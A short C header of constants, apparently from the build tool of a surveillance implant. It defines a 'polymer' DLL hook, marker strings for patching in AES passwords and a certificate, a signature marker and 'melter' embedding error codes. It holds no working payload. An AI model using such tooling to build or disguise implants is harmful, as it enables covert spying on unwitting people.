

#define POLYMERDLL L"POLYMER.DLL"
typedef void (*PolymerT)(TCHAR *);
#define POLYFUNC "_polymer"

#define AES_LOG_PASS_MARK  "ngkdNGKDh4H4883"
#define AES_CONF_PASS_MARK  "ngkdNGKDh4H4869"
#define AES_MARK_LEN 15
#define PEM_CERT_MARK  "HT_CERT_PUBLIC_KEY01"
#define PEM_KEY_LEN    140
#define SIGNATURE_MARK "A02H90JL00000000"
#define SIGNATURE_LEN  strlen(SIGNATURE_MARK)

#define ERROR_OUTPUT			-1
#define ERROR_EMBEDDING			-2
#define ERROR_POLYMER			-3
#define ERROR_NO_MELTER			-100
#define ERROR_INVALID_MELTER	-101
